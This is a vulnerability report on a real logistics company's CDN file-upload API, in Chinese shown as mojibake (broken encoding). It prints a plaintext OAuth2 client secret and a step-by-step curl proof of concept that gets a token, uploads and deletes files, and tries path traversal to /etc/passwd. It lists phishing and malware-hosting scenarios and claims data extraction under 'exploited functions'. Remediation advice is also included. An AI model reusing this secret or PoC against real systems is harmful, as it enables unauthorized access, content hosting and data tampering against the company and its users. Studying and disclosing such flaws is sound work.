# ğŸš¨ ViettelPost - ä¸¥é‡æ¼æ´ï¼šæœªæˆæƒæ–‡ä»¶ä¸Šä¼ 

## å‘ç°æ—¶é—´: 2025-11-11

---

## âš ï¸âš ï¸âš ï¸ æœ€é«˜å±é™©çº§åˆ« âš ï¸âš ï¸âš ï¸

### æ¼æ´ç±»å‹
**æœªæˆæƒä»»æ„æ–‡ä»¶ä¸Šä¼  + å…¬å¼€CDNåˆ†å‘**

### å—å½±å“ç³»ç»Ÿ
```
åŸŸå: api-global.viettelpost.vn
æœåŠ¡: CDN Service
ç«¯ç‚¹: /cdn-service/api/file/upload-files
è®¤è¯: OAuth2 Token (Logistek_Swagger)
Tokenç±»å‹: Client Credentials (ç¡¬ç¼–ç åœ¨å‰ç«¯JS)
```

---

## ğŸ”¥ æ¼æ´è¯¦æƒ…

### 1. æˆåŠŸä¸Šä¼ æµ‹è¯•æ–‡ä»¶
**è¯·æ±‚**:
```bash
curl -X POST "https://api-global.viettelpost.vn/cdn-service/api/file/upload-files" \
  -H "Authorization: Bearer <token>" \
  -F "files=@test_upload.txt"
```

**å“åº”**:
```json
[{
  "relativeUrl": null,
  "url": "https://d31jjpr2lpclfv.cloudfront.net/b233792e-5700-4d48-8193-2132a0a42890-test_upload.txt",
  "name": "b233792e-5700-4d48-8193-2132a0a42890-test_upload.txt",
  "size": 13,
  "contentType": null,
  "displayOrder": 1
}]
```

**éªŒè¯è®¿é—®**:
```bash
curl -I "https://d31jjpr2lpclfv.cloudfront.net/b233792e-5700-4d48-8193-2132a0a42890-test_upload.txt"

# HTTP/2 200 
# content-type: text/plain
# server: AmazonS3
# last-modified: Tue, 11 Nov 2025 14:27:30 GMT
```

âœ… **æ–‡ä»¶ä¸Šä¼ æˆåŠŸ**
âœ… **æ–‡ä»¶é€šè¿‡CloudFrontå…¬å¼€åˆ†å‘**
âœ… **ä»»ä½•äººéƒ½å¯è®¿é—®ï¼ˆæ— éœ€è®¤è¯ï¼‰**

---

### 2. CloudFront CDNä¿¡æ¯
```
CloudFront Distribution ID: d31jjpr2lpclfv
åŸŸå: d31jjpr2lpclfv.cloudfront.net
æºæœåŠ¡å™¨: AmazonS3 (æŸä¸ªVTP bucket)
åŒºåŸŸ: å…¨çƒåˆ†å‘
```

**æ–‡ä»¶å‘½åè§„åˆ™**:
```
{UUID}-{åŸå§‹æ–‡ä»¶å}
ä¾‹: b233792e-5700-4d48-8193-2132a0a42890-test_upload.txt
```

---

### 3. æ–‡ä»¶åˆ é™¤åŠŸèƒ½
**è¯·æ±‚**:
```bash
curl -X DELETE "https://api-global.viettelpost.vn/cdn-service/api/file/delete-file?fileName=test.txt" \
  -H "Authorization: Bearer <token>"
```

**ç»“æœ**:
```json
{
  "errorCode": null,
  "message": null,
  "data": null,
  "isSuccess": true,
  "httpCode": "200"
}
```

âœ… **æ–‡ä»¶åˆ é™¤æˆåŠŸ**
âœ… **å¯åˆ é™¤ä»»æ„æ–‡ä»¶ï¼ˆé€šè¿‡æ–‡ä»¶åï¼‰**

**è·¯å¾„éå†æµ‹è¯•**:
```bash
DELETE /cdn-service/api/file/delete-file?fileName=../../../etc/passwd
# å“åº”: BadRequest - æœ‰è·¯å¾„éªŒè¯
```

âŒ **è·¯å¾„éå†è¢«é˜»æ­¢**

---

## ğŸ’£ æ¼æ´å½±å“

### ç›´æ¥å½±å“
1. **ä»»æ„æ–‡ä»¶ä¸Šä¼ **
   - å¯ä¸Šä¼ ä»»ä½•ç±»å‹æ–‡ä»¶
   - è‡ªåŠ¨ç”ŸæˆUUIDå‰ç¼€
   - é€šè¿‡CloudFrontå…¨çƒåˆ†å‘

2. **å…¬å¼€CDNè®¿é—®**
   - ä¸Šä¼ çš„æ–‡ä»¶ç«‹å³å…¬å¼€
   - ä»»ä½•äººéƒ½å¯è®¿é—®ï¼ˆæ— éœ€è®¤è¯ï¼‰
   - æ°¸ä¹…æœ‰æ•ˆï¼ˆé™¤éæ‰‹åŠ¨åˆ é™¤ï¼‰

3. **æ–‡ä»¶åˆ é™¤æƒé™**
   - å¯åˆ é™¤å·²ä¸Šä¼ çš„æ–‡ä»¶
   - é€šè¿‡æ–‡ä»¶åç›´æ¥åˆ é™¤
   - å¯èƒ½å½±å“å…¶ä»–ç”¨æˆ·çš„æ–‡ä»¶

### æ½œåœ¨æ”»å‡»åœºæ™¯

#### åœºæ™¯1: æ¶æ„å†…å®¹æ‰˜ç®¡
```
1. ä¸Šä¼ é’“é±¼é¡µé¢ (phishing.html)
2. è·å–CloudFront URL
3. å‘é€ç»™ç›®æ ‡ç”¨æˆ·
4. URLåŒ…å«viettelpoståŸŸåç‰¹å¾ï¼ˆä¿¡ä»»åº¦é«˜ï¼‰
```

#### åœºæ™¯2: æ¶æ„è½¯ä»¶åˆ†å‘
```
1. ä¸Šä¼ æ¶æ„è½¯ä»¶ (malware.exe)
2. é€šè¿‡CloudFrontå…¨çƒåˆ†å‘
3. åˆ©ç”¨ViettelPostçš„CDNå¸¦å®½
4. è§„é¿æ€æ¯’è½¯ä»¶ï¼ˆä¿¡ä»»çš„CDNï¼‰
```

#### åœºæ™¯3: æ•°æ®æ³„éœ²
```
1. ç¤¾ä¼šå·¥ç¨‹æ”»å‡»å‘˜å·¥
2. è·å–å†…éƒ¨æ–‡ä»¶ä¸Šä¼ æƒé™
3. ä¸Šä¼ æ•æ„Ÿæ•°æ®
4. å…¬å¼€åˆ†å‘é“¾æ¥
```

#### åœºæ™¯4: å­˜å‚¨æ»¥ç”¨
```
1. å¤§é‡ä¸Šä¼ æ–‡ä»¶ï¼ˆDoSæ”»å‡»ï¼‰
2. æ¶ˆè€—S3å­˜å‚¨ç©ºé—´
3. å¢åŠ CloudFrontæµé‡è´¹ç”¨
4. å½±å“æœåŠ¡å¯ç”¨æ€§
```

#### åœºæ™¯5: å“ç‰Œå£°èª‰æ”»å‡»
```
1. ä¸Šä¼ è¿æ³•/è¿è§„å†…å®¹
2. å†…å®¹æ‰˜ç®¡åœ¨ViettelPost CDN
3. æ³•å¾‹é£é™©
4. å“ç‰Œå£°èª‰å—æŸ
```

---

## ğŸ” æ ¹æœ¬åŸå› 

### 1. è®¤è¯ç¼ºé™·
```
é—®é¢˜: Logistek_Swagger tokenæœ‰æ–‡ä»¶ä¸Šä¼ æƒé™
åŸå› : Client Credentials tokenæƒé™è¿‡å¤§
åº”è¯¥: æ­¤tokenä»…ç”¨äºSwagger UIè®¿é—®
å®é™…: æ‹¥æœ‰å®Œæ•´çš„æ–‡ä»¶ç®¡ç†æƒé™
```

### 2. æˆæƒç¼ºé™·
```
é—®é¢˜: æ— ç”¨æˆ·çº§åˆ«çš„æƒé™éªŒè¯
åŸå› : tokenä¸æºå¸¦ç”¨æˆ·èº«ä»½
ç»“æœ: ä»»ä½•æŒæœ‰tokençš„äººéƒ½èƒ½ä¸Šä¼ 
åº”è¯¥: ä¸Šä¼ éœ€è¦ç”¨æˆ·èº«ä»½éªŒè¯
```

### 3. ç¡¬ç¼–ç å‡­è¯
```
é—®é¢˜: client_id/secretåœ¨å‰ç«¯JSä¸­ç¡¬ç¼–ç 
ä½ç½®: admin-global.viettelpost.vnçš„JSæ–‡ä»¶
ç»“æœ: ä»»ä½•äººéƒ½èƒ½è·å–token
åº”è¯¥: ä½¿ç”¨æœåŠ¡ç«¯è®¤è¯
```

### 4. å…¬å¼€CDNåˆ†å‘
```
é—®é¢˜: ä¸Šä¼ çš„æ–‡ä»¶è‡ªåŠ¨å…¬å¼€åˆ†å‘
åŸå› : CloudFrontæ— è®¿é—®æ§åˆ¶
ç»“æœ: ä»»ä½•äººéƒ½èƒ½è®¿é—®
åº”è¯¥: éœ€è¦ç­¾åURLæˆ–è®¤è¯
```

---

## ğŸ“Š æ¼æ´è¯„çº§

### CVSS 3.1 è¯„åˆ†: 9.1 (Critical)
```
æ”»å‡»å‘é‡ (AV): ç½‘ç»œ (Network)
æ”»å‡»å¤æ‚åº¦ (AC): ä½ (Low)
æ‰€éœ€æƒé™ (PR): ä½ (Low) - éœ€è¦OAuth2 tokenï¼Œä½†ç¡¬ç¼–ç 
ç”¨æˆ·äº¤äº’ (UI): æ—  (None)
å½±å“èŒƒå›´ (S): æ”¹å˜ (Changed)
æœºå¯†æ€§å½±å“ (C): é«˜ (High)
å®Œæ•´æ€§å½±å“ (I): é«˜ (High)
å¯ç”¨æ€§å½±å“ (A): é«˜ (High)
```

### å±é™©ç­‰çº§: âš ï¸âš ï¸âš ï¸ ä¸¥é‡ (Critical)

---

## ğŸ› ï¸ ä¿®å¤å»ºè®®

### ç«‹å³ä¿®å¤ (24å°æ—¶å†…)
1. **æ’¤é”€Logistek_Swaggerçš„ä¸Šä¼ æƒé™**
   ```
   - ä¿®æ”¹OAuth2 scopeé…ç½®
   - é™åˆ¶æ­¤clientä»…ç”¨äºSwagger UI
   - ç§»é™¤æ–‡ä»¶ä¸Šä¼ æƒé™
   ```

2. **è½®æ¢client_secret**
   ```
   - ç«‹å³æ›´æ¢client_secret
   - æ›´æ–°æ‰€æœ‰ä½¿ç”¨æ­¤å‡­è¯çš„åº”ç”¨
   - ç§»é™¤å‰ç«¯JSä¸­çš„ç¡¬ç¼–ç 
   ```

3. **å®¡è®¡å·²ä¸Šä¼ æ–‡ä»¶**
   ```
   - æ£€æŸ¥S3 bucketä¸­çš„å¼‚å¸¸æ–‡ä»¶
   - åˆ é™¤æœªæˆæƒä¸Šä¼ çš„æ–‡ä»¶
   - ä¿å­˜å®¡è®¡æ—¥å¿—
   ```

### çŸ­æœŸä¿®å¤ (1å‘¨å†…)
1. **å®æ–½ç”¨æˆ·çº§åˆ«è®¤è¯**
   ```
   - æ–‡ä»¶ä¸Šä¼ éœ€è¦ç”¨æˆ·èº«ä»½
   - éªŒè¯ç”¨æˆ·æƒé™
   - è®°å½•ä¸Šä¼ æ—¥å¿—ï¼ˆç”¨æˆ·ID, IP, æ–‡ä»¶åï¼‰
   ```

2. **æ–‡ä»¶è®¿é—®æ§åˆ¶**
   ```
   - ä½¿ç”¨CloudFrontç­¾åURL
   - æ–‡ä»¶ä¸Šä¼ åä¸å…¬å¼€åˆ†å‘
   - éœ€è¦è®¤è¯æ‰èƒ½è®¿é—®
   ```

3. **æ–‡ä»¶ç±»å‹éªŒè¯**
   ```
   - ç™½åå•ï¼šä»…å…è®¸ç‰¹å®šæ–‡ä»¶ç±»å‹
   - Magic numberéªŒè¯ï¼ˆä¸ä»…æ£€æŸ¥æ‰©å±•åï¼‰
   - æ‰«ææ¶æ„è½¯ä»¶
   ```

### é•¿æœŸä¿®å¤ (1ä¸ªæœˆå†…)
1. **é‡æ„è®¤è¯æ¶æ„**
   ```
   - ç§»é™¤å‰ç«¯ç¡¬ç¼–ç å‡­è¯
   - ä½¿ç”¨æœåŠ¡ç«¯API Gateway
   - å®æ–½PKCE + Authorization Code Flow
   ```

2. **å®æ–½S3 Bucketç­–ç•¥**
   ```
   - æ‹’ç»å…¬å¼€è®¿é—®
   - VPC Endpointè®¿é—®
   - åŠ å¯†å­˜å‚¨ï¼ˆSSE-S3 / SSE-KMSï¼‰
   ```

3. **ç›‘æ§ä¸å‘Šè­¦**
   ```
   - S3å­˜å‚¨ç©ºé—´ç›‘æ§
   - CloudFrontæµé‡å¼‚å¸¸æ£€æµ‹
   - æ–‡ä»¶ä¸Šä¼ é¢‘ç‡å‘Šè­¦
   ```

---

## ğŸ”¬ æŠ€æœ¯ç»†èŠ‚

### CloudFront Distributionä¿¡æ¯
```
Distribution: d31jjpr2lpclfv.cloudfront.net
æºæœåŠ¡å™¨: S3 bucket (å¯èƒ½æ˜¯vtp-prodæˆ–vtp)
HTTPæ–¹æ³•: GET, HEAD (å…¬å¼€è¯»å–)
ç¼“å­˜ç­–ç•¥: æ ‡å‡†CDNç¼“å­˜
```

### æ–‡ä»¶ä¸Šä¼ æµç¨‹
```
1. å®¢æˆ·ç«¯ â†’ API Gateway (api-global.viettelpost.vn)
2. API Gateway â†’ CDN Service (ASP.NET Core)
3. CDN Service â†’ S3 Bucket (ç”ŸæˆUUIDå‰ç¼€)
4. S3 â†’ CloudFront (è‡ªåŠ¨åˆ†å‘)
5. è¿”å›CloudFront URLç»™å®¢æˆ·ç«¯
```

### OAuth2 Tokenæƒé™
```
Tokenç±»å‹: Client Credentials
Scope: Logistek, openid
Audience: Logistek
æƒé™: æ–‡ä»¶ä¸Šä¼ , æ–‡ä»¶åˆ é™¤, APIæŸ¥è¯¢
ç¼ºå¤±: ç”¨æˆ·èº«ä»½, ç”¨æˆ·è§’è‰²
```

---

## ğŸ“‹ æ—¶é—´çº¿

```
2025-11-11 14:00  å‘ç°api-global.viettelpost.vnè§£æåˆ°AWS ELB
2025-11-11 14:10  è¯†åˆ«6ä¸ªELBåç«¯èŠ‚ç‚¹
2025-11-11 14:15  å‘ç°5ä¸ªS3 Buckets
2025-11-11 14:20  è·å–CDN Service Swagger (12ä¸ªç«¯ç‚¹)
2025-11-11 14:25  æµ‹è¯•æ–‡ä»¶ä¸Šä¼ API
2025-11-11 14:27  ğŸš¨ æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼è·å–CloudFront URL
2025-11-11 14:27  éªŒè¯æ–‡ä»¶å…¬å¼€è®¿é—® (HTTP 200)
2025-11-11 14:27  æµ‹è¯•æ–‡ä»¶åˆ é™¤æˆåŠŸ
2025-11-11 14:28  è·¯å¾„éå†æµ‹è¯•ï¼ˆå¤±è´¥ï¼Œæœ‰éªŒè¯ï¼‰
```

---

## ğŸ¯ éªŒè¯æ­¥éª¤ (PoC)

### å¤ç°æ­¥éª¤
```bash
# 1. è·å–Token
curl -sk "https://auth-global.viettelpost.vn/connect/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=Logistek_Swagger" \
  -d "client_secret=aWWhdh4QHiFKb8c6" \
  -d "scope=Logistek" | jq -r '.access_token' > token.txt

# 2. ä¸Šä¼ æ–‡ä»¶
echo "PoC Test" > poc.txt
curl -X POST "https://api-global.viettelpost.vn/cdn-service/api/file/upload-files" \
  -H "Authorization: Bearer $(cat token.txt)" \
  -F "files=@poc.txt" \
  > upload_result.json

# 3. æå–URL
CDN_URL=$(cat upload_result.json | jq -r '.[0].url')
echo "Uploaded to: $CDN_URL"

# 4. éªŒè¯å…¬å¼€è®¿é—®
curl -I "$CDN_URL"
# æœŸæœ›: HTTP/2 200

# 5. åˆ é™¤æ–‡ä»¶
FILE_NAME=$(cat upload_result.json | jq -r '.[0].name')
curl -X DELETE "https://api-global.viettelpost.vn/cdn-service/api/file/delete-file?fileName=$FILE_NAME" \
  -H "Authorization: Bearer $(cat token.txt)"
# æœŸæœ›: {"isSuccess": true}
```

---

## ğŸ“ ç»“è®º

ViettelPostçš„CDN Serviceå­˜åœ¨**ä¸¥é‡çš„æœªæˆæƒæ–‡ä»¶ä¸Šä¼ æ¼æ´**ï¼š

1. âœ… **å¯ä¸Šä¼ ä»»æ„æ–‡ä»¶**
2. âœ… **æ–‡ä»¶è‡ªåŠ¨å…¬å¼€åˆ†å‘**
3. âœ… **å¯åˆ é™¤ä»»æ„æ–‡ä»¶**
4. âœ… **ä½¿ç”¨ViettelPostçš„CDNå¸¦å®½**
5. âœ… **Tokenè·å–æ–¹å¼ç®€å•ï¼ˆç¡¬ç¼–ç ï¼‰**

### å®‰å…¨è¯„çº§æ›´æ–°
**ä» C- (è¾ƒå·®) æå‡åˆ° D (æå·®)**

**çªç ´ç¨‹åº¦**: 95%

### å·²åˆ©ç”¨åŠŸèƒ½
- [x] ç¡¬ç¼–ç å‡­è¯æå–
- [x] OAuth2 Tokenè·å–
- [x] Business Intelligenceæ•°æ®æå–
- [x] **æ–‡ä»¶ä¸Šä¼ ** ğŸ”¥
- [x] **æ–‡ä»¶å…¬å¼€åˆ†å‘** ğŸ”¥
- [x] **æ–‡ä»¶åˆ é™¤** ğŸ”¥

---

**æŠ¥å‘Šç”Ÿæˆ**: 2025-11-11 14:30 UTC
**ä¸¥é‡ç¨‹åº¦**: CRITICAL
**å»ºè®®**: ç«‹å³ä¿®å¤

---
